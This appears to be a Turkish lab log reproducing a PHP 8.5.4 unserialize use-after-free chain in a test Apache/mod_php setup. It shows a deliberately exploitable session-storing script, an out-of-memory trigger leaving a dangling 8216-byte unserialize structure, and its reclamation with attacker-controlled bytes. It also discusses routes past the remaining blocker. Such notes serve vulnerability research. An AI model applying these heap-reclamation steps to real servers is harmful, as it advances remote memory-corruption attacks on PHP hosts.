# PHP 8.5.4 ortamı: pre-RINIT BG(unserialize) OOM ve 8216 baytlık geri kazanım

Tarih: 2026-10-21
Host: 172.16.0.103 (Debian 12.15, Apache 2.4.68 prefork/mod_php)
PHP: 8.5.4 kendimiz derledik (`/opt/php855`, `--with-apxs2`, opcache yok)
ASLR: bu test için kapalı (`personality=000040000`)

## Kurulan ortam

- `~/php-lab-855/php-8.5.4`, `/opt/php855`'e kuruldu; Apache modülü
  `/usr/lib/apache2/modules/libphp.so` 8.5.4 build'iyle değiştirildi.
- `/var/www/php-lab/www/index.php` = nötr `<?php echo "OK\n"; ?>`.
- Uygulama emülasyonu ("karşılık gelen uygulama ortamı"):
  `/var/www/php-lab/www/app/mklist.php`, `$_SESSION`'da saldırgan-etkili bir nesne saklar:

```php
session_start();
$k = (int)$_POST['k'];
$o = new stdClass;
$l = new SplDoublyLinkedList;
for ($i=0; $i<$k; $i++) { $l->push($o); }
$_SESSION['x'] = $l;
```

  Uygulama dizininde `php_admin_value memory_limit 256M`; upload uç noktası
  (`/index.php`) 8M ve 64M'de test edildi.

- Session dosyası örneği (k=700000, `php` serileştiricisi, kompakt tekrarlı nesne):

```text
/tmp/sess_list700000p0(?) = 8.988.971 bayt
x|O:19:"SplDoublyLinkedList":3:{i:0;i:0;i:1;a:700000:{i:0;O:8:"stdClass":0:{}i:1;r:4;...}i:2;a:0:{}}
```

## var_destroy'da OOM (istihbaratın 1. adımı)

Yapılandırma: upload uç noktası `memory_limit 64M`, k=700000 olan session,
istek A = multipart upload_progress (cookie PHPSESSID, progress alanı, dosya),
pad alanı yok.

```text
Fatal error: Allowed memory size of 67108864 bytes exhausted (tried to allocate 4096 bytes)
BAILOUT lock=1 level=1 data=0x7ffff4a70000
#8  spl_ptr_llist_push (llist=..., data=...)
#9  zim_SplDoublyLinkedList___unserialize
#10 zend_call_function
#11 zend_call_known_function
#12 zend_call_known_instance_method_with_1_params
#13 var_destroy
#14 php_var_unserialize_destroy
```

İstekten sonra:

```text
serialize_lock = 1
unserialize.level = 1
unserialize.data = 0x7ffff4a70000
data->last        = 0x7ffff39d5000
entries.next      = 0x7ffff4a75000
```

`var_entries` zinciri, gecikmeli `__unserialize` OOM'undan önce `var_destroy`
tarafından zaten serbest bırakılmıştı. Üst düzey `php_unserialize_data`
(8.5.4'te de `sizeof = 8216`) stale'dir ve aşağıda gösterildiği gibi serbest bırakılmıştır.

## 8216 baytlık data nesnesinin geri kazanımı (istihbarat 2. adım)

İstek B: iki 8214 baytlık parametre (`p1`, `p2`) ve bir dosya alanı içeren
multipart, progress/cookie alanı yok.

B'den önce:

```text
0x7ffff4a70000: 0x00007ffff39d5000 0x00007ffff4a73000
0x7ffff4a70010: 0x00007ffff4a73000 0x0000000000000000
...
```

B'den sonra:

```text
0x7ffff4a70000: 0x4242424242424242 0x4242424242424242
0x7ffff4a70010: 0x0000424242424242 0x0000000000000000
```

Stale 8216 baytlık `php_unserialize_data` bloğu, B multipart parametre verisiyle
geri kazanıldı. Bu, istihbaratın 8214 baytlık geri kazanım adımını 8.5.4'te doğrular.

## Bu yeniden kurgulamada 3-6. adımlar için engel

A'dan sonra, `BG(serialize_lock)=1`. B'nin *pre-RINIT* session decode'u
`php_var_unserialize_init`'i çağırır, bu da `serialize_lock != 0` görür ve
`BG.data`'yı yeniden kullanmak yerine **yeni bir yerel** `php_unserialize_data`
tahsis eder. B'nin RINIT'i ardından `BG(unserialize)`'i `memset`'ler ve
`serialize_lock`'u temizler. Yani bu yeniden kurgulamada geri kazanılan fake
`data`, `var_push` tarafından tüketilmez.

İstihbaratın 3. adımı ("geçerli bir 48 bitlik `data->last` işaretçisi kurmak"),
`var_push`'ın geri kazanılan `BG.data`'yı kullanmasını gerektirir, yani init
anında `serialize_lock=0` iken `level=1` ve `data` sarkan. 8.5.4'ün
`php_var_unserialize_destroy`'ında, `d`'yi lock=0 ile serbest bırakmak ayrıca
level'ı 0'a ve `data`'yı NULL'a sıfırlar; lock=1 yolu `data`'yı sarkan bırakır
ama lock'u set eder. Bunu çözmek şunlardan birini gerektirir:

- RINIT'ten önce stale `BG.data`'ya isabet eden `unserialize()`/`session_decode()` çağıran bir uygulama yolu, ya da
- `d`'yi `serialize_lock=0` bırakacak şekilde serbest bırakan farklı bir OOM noktası (ör. lock penceresinden sonra dtor döngüsünde OOM), ya da
- muhtemelen session decode'un tek başına değil hedef uygulamanın unserialize çağrısını kullanan, orijinal 8.5.4 exploit'inin tam dizisi.

## Varlıklar (artifacts)

- `/tmp/sendA_pad.py`, `/tmp/sendA_multi.py`, `/tmp/sendA_cookie.py` —
  upload_progress istek A varyantları.
- `/tmp/sendB_reclaim.py` — iki 8214 baytlık geri kazanım parametresi.
- `/tmp/mklist.php`, `.103:/var/www/php-lab/www/app/mklist.php` —
  SplDoublyLinkedList session'ını yazan uygulama.
- `/tmp/test_list_pad.sh`, `/tmp/test_list_multi.sh` — OOM/trace sürücüleri.
